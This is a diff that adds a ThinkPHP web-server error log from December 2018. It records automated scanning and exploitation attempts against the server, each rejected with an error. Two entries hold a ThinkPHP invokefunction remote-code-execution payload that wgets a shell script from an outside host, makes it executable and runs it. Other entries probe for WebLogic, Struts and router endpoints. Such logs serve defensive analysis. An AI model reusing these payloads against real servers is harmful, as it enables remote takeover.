@@ -1,0 +1,27 @@
+[ 2018-12-19T03:47:32+08:00 ] 84.50.67.53 /ncsi.txt
+ERR: 无法加载控制器:Ncsi.txt
+
+[ 2018-12-19T03:47:32+08:00 ] 84.50.67.53 /HNAP1/
+ERR: 无法加载控制器:HNAP1
+
+[ 2018-12-19T09:17:03+08:00 ] 115.231.233.38 /index.action
+ERR: 无法加载控制器:Index.action
+
+[ 2018-12-19T10:59:47+08:00 ] 103.70.225.86 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-12-19T13:08:15+08:00 ] 80.211.89.146 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://80.211.89.146/z.sh;%20chmod%20+x%20z.sh;%20sh%20z.sh%20
+ERR: 非法操作:\think\app
+
+[ 2018-12-19T14:45:25+08:00 ] 194.147.32.109 //recordings/
+ERR: 无法加载控制器:Recordings
+
+[ 2018-12-19T20:21:39+08:00 ] 5.8.54.27 /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
+ERR: 非法操作:\think\app
+
+[ 2018-12-19T20:36:06+08:00 ] 118.89.51.192 /wls-wsat/CoordinatorPortType
+ERR: 无法加载控制器:Wls-wsat
+
+[ 2018-12-19T21:34:09+08:00 ] 80.211.89.146 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://80.211.89.146/z.sh;%20chmod%20+x%20z.sh;%20sh%20z.sh%20
+ERR: 非法操作:\think\app
+
